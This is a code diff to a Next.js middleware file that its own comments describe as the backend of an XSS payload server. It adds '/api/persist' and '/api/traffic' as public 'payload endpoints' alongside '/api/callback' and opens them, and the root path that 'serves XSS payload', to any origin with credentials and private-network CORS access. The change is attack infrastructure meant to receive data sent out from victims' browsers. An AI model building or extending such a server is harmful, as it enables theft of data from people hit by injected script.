@@ -19,9 +19,11 @@ const publicRoutes = [
     '/api/setup/sync',
 ];
 
-// Routes that should be completely public (no redirect)
+// Routes that should be completely public (no redirect) - XSS payload endpoints
 const publicApiRoutes = [
     '/api/callback',
+    '/api/persist',
+    '/api/traffic',
     '/api/setup/health',
     '/api/setup/sync',
 ];
@@ -29,14 +31,45 @@ const publicApiRoutes = [
 export async function middleware(request: NextRequest) {
     const { pathname } = request.nextUrl;
 
-    // Allow public API routes
-    if (publicApiRoutes.some(route => pathname.startsWith(route))) {
-        return NextResponse.next();
+    // CORS headers for payload APIs
+    const corsHeaders = {
+        'Access-Control-Allow-Origin': '*',
+        'Access-Control-Allow-Methods': 'GET, POST, PUT, DELETE, OPTIONS, HEAD, PATCH',
+        'Access-Control-Allow-Headers': '*',
+        'Access-Control-Allow-Credentials': 'true',
+        'Access-Control-Max-Age': '86400',
+        'Access-Control-Allow-Private-Network': 'true',
+        'Access-Control-Expose-Headers': '*',
+    };
+
+    // Check if this is a public API route (for payload)
+    const isPublicApiRoute = publicApiRoutes.some(route => pathname.startsWith(route));
+
+    // Handle CORS preflight (OPTIONS) for payload APIs - MUST respond before any other checks
+    if (request.method === 'OPTIONS' && isPublicApiRoute) {
+        return new NextResponse(null, {
+            status: 204,
+            headers: corsHeaders,
+        });
     }
 
-    // Root path serves XSS payload - public
+    // Allow public API routes - add CORS headers to response
+    if (isPublicApiRoute) {
+        const response = NextResponse.next();
+        // Add CORS headers to ALL responses from public API routes
+        Object.entries(corsHeaders).forEach(([key, value]) => {
+            response.headers.set(key, value);
+        });
+        return response;
+    }
+
+    // Root path serves XSS payload - public with CORS
     if (pathname === '/') {
-        return NextResponse.next();
+        const response = NextResponse.next();
+        Object.entries(corsHeaders).forEach(([key, value]) => {
+            response.headers.set(key, value);
+        });
+        return response;
     }
 
     // Allow public routes
